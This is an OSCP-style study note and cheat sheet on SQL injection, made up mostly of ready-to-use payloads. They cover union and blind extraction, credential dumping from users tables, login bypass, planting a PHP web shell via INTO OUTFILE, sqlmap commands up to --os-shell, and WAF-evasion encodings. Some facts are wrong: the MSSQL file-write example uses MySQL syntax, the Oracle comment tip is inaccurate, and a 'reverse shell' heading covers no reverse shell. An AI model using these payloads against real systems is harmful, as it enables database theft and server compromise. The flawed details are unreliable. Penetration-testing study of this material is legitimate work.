---
tags: [oscp, web, sqli, injection]
aliases: [SQL Injection Exploitation]
category: Web
difficulty: ★★★☆☆
last-updated: 2025-04-30
---

# 💉 SQL Injection (Deep Dive)

> [!info] The Crown Jewel
> SQLi is one of the most powerful vulnerabilities. Database = often system passwords.

---

## 🎯 SQLi Types

| Type | Detection | Automation |
|------|-----------|-----------|
| **Union-Based** | UNION SELECT | Medium |
| **Boolean-Based** | True/False responses | Hard |
| **Time-Based Blind** | Response delay | Hard |
| **Error-Based** | SQL error messages | Medium |

---

## 1️⃣ Union-Based SQLi (Fastest)

### Basic Test

```sql
' UNION SELECT NULL, NULL, NULL-- -
' UNION SELECT 1, 2, 3-- -
```

### Find Column Count

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
# Keep incrementing until error → column count found
```

### Extract Data

```sql
' UNION SELECT table_name, column_name FROM information_schema.tables-- -
' UNION SELECT username, password FROM users-- -
' UNION SELECT @@version, user()-- -
```

### SQLMap

```bash
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D database -T users --dump
```

---

## 2️⃣ Boolean-Based Blind SQLi

### Test

```sql
' AND '1'='1'  # True
' AND '1'='2'  # False

# If true page displays normally, false shows error
# → you can extract data bit by bit
```

### Extraction (Slow)

```sql
' AND SUBSTRING(version(),1,1)='5' # Check MySQL version starts with 5
' AND ASCII(SUBSTRING(user(),1,1))>64 # Check first char of user
```

### Faster with SQLMap

```bash
sqlmap -u "http://target/page?id=1" --technique=B --dbs
```

---

## 3️⃣ Time-Based Blind SQLi

### Test

```sql
' AND SLEEP(5)-- -
' AND IF(1=1, SLEEP(5), 0)-- -

# If page delays 5 seconds, time-based blind SQLi exists
```

### SQLMap

```bash
sqlmap -u "http://target/page?id=1" --technique=T --dbs
```

---

## 🗄️ SQLi to Database Enumeration

### Information Schema (MySQL)

```sql
# All databases
' UNION SELECT schema_name FROM information_schema.schemata-- -

# All tables in database
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='dbname'-- -

# All columns in table
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -

# Extract data
' UNION SELECT username, password FROM dbname.users-- -
```

### System Privileges (MySQL)

```sql
' UNION SELECT user, file_priv FROM mysql.user-- -
# If file_priv='Y', can read/write files!

# Current user
' UNION SELECT user()-- -
' UNION SELECT @@datadir-- -
```

---

## 💾 SQLi to File Write (RCE)

### MySQL INTO OUTFILE

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Prerequisites:**
- User has FILE privilege
- /var/www/html/ is writable
- PHP is enabled

### MSSQL into File

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:\inetpub\wwwroot\shell.php'-- -
```

---

## 🔓 SQLi to Authentication Bypass

### Admin Login Without Password

```sql
Username: admin' --
Password: anything

# Query: SELECT * FROM users WHERE username='admin' -- ' AND password='...'
# Comment removes password check
```

---

## 🛠️ SQLMap Commands

### Basic Scan

```bash
sqlmap -u "http://target/page?id=1" --dbs
```

### POST Request

```bash
sqlmap -u "http://target/login" --data="user=admin&pass=test" -p user --dbs
```

### Cookie Injection

```bash
sqlmap -u "http://target" -H "Cookie: id=1" -p id --dbs
```

### Extract Tables

```bash
sqlmap -u "http://target/page?id=1" -D database_name --tables
```

### Dump Users

```bash
sqlmap -u "http://target/page?id=1" -D database_name -T users --dump
```

### Get Reverse Shell

```bash
sqlmap -u "http://target/page?id=1" --os-cmd "whoami"
sqlmap -u "http://target/page?id=1" --os-shell  # Interactive shell
```

---

## 📋 SQLi Exploitation Checklist

- [ ] Test basic SQLi: `'` or `1=1`
- [ ] Identify query type (UNION, Blind, Time-based)
- [ ] Use SQLMap for automated extraction
- [ ] Dump user credentials
- [ ] Check file privileges (for FILE write)
- [ ] Attempt file write for RCE
- [ ] If file write fails, check for OS command execution via UDF

---

---

## 💡 Pro Tips

> [!tip] Always Test Manually First
> Understand the injection before using SQLMap. You might miss nuances.

> [!tip] Comment Syntax Matters
> - MySQL: `-- -` or `#`
> - MSSQL: `--`
> - Oracle: `-` not recognized, use `/**/`

> [!info] Bypass WAF
> - Spaces: `/**/`, `%09`, `%0a`
> - Keywords: `UnIoN`, `u/**/nion`, `uni/**/on`
- Quotes: `0x...` (hex encoding)

---

**Related Notes:**
- [[04-Web/Web-Vulnerabilities|🌐 Web Vulnerabilities]]
- [[04-Web/LFI-RFI-to-RCE|🔗 LFI/RFI to RCE]]

---
